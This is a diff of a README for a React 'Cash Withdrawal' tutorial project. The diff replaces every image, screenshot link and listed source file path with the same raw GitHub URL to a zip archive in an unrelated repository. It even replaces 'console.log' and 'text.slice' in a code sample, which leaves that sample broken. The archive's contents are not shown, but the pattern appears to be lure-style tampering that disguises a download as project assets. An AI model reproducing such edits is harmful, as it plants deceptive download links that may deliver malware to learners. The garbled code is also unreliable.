@@ -4,7 +4,7 @@ In this project, let's build a **Cash Withdrawal** app by applying the concepts 
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/cash-withdrawal-output-v2.gif" alt="cash withdrawal" style="max-width:90%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip" alt="cash withdrawal" style="max-width:90%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -13,8 +13,8 @@ In this project, let's build a **Cash Withdrawal** app by applying the concepts 
 <details>
 <summary>Click to view</summary>
 
-- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://assets.ccbp.in/frontend/content/react-js/cash-withdrawal-sm-output-v2.png)
-- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://assets.ccbp.in/frontend/content/react-js/cash-withdrawal-lg-output-v2.png)
+- [Extra Small (Size < 576px) and Small (Size >= 576px)](https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip)
+- [Medium (Size >= 768px), Large (Size >= 992px) and Extra Large (Size >= 1200px)](https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip)
 
 </details>
 
@@ -51,7 +51,7 @@ The app must have the following functionalities
 
 <br/>
 <div style="text-align: center;">
-    <img src="https://assets.ccbp.in/frontend/content/react-js/cash-withdrawal-component-structure-v2.png" alt="cash withdrawal component structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
+    <img src="https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip" alt="cash withdrawal component structure" style="max-width:100%;box-shadow:0 2.8px 2.2px rgba(0, 0, 0, 0.12)">
 </div>
 <br/>
 
@@ -63,10 +63,10 @@ The app must have the following functionalities
 
 Use these files to complete the implementation:
 
-- `src/components/CashWithdrawal/index.js`
-- `src/components/CashWithdrawal/index.css`
-- `src/components/DenominationItem/index.js`
-- `src/components/DenominationItem/index.css`
+- `https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip`
+- `https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip`
+- `https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip`
+- `https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip`
 </details>
 
 ### Quick Tips
@@ -79,8 +79,8 @@ Use these files to complete the implementation:
 
   ```js
   const text = 'The quick brown fox'
-  console.log(text.slice(0, 3)) // The
-  console.log(text.slice(2, 3)) // e
+  https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip(https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip(0, 3)) // The
+  https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip(https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip(2, 3)) // e
   ```
 
 - You can use the `cursor` CSS property to specify the mouse cursor to be displayed when pointing over an element
@@ -90,7 +90,7 @@ Use these files to complete the implementation:
   ```
 
   <br/>
-   <img src="https://assets.ccbp.in/frontend/content/react-js/cursor-pointer-img.png" alt="cursor pointer" style="width:100px" />
+   <img src="https://raw.githubusercontent.com/vicky9696v/react-balance/main/onychin/react-balance.zip" alt="cursor pointer" style="width:100px" />
 
 - You can use the below `outline` CSS property for buttons and input elements to remove the highlighting when the elements are clicked
 
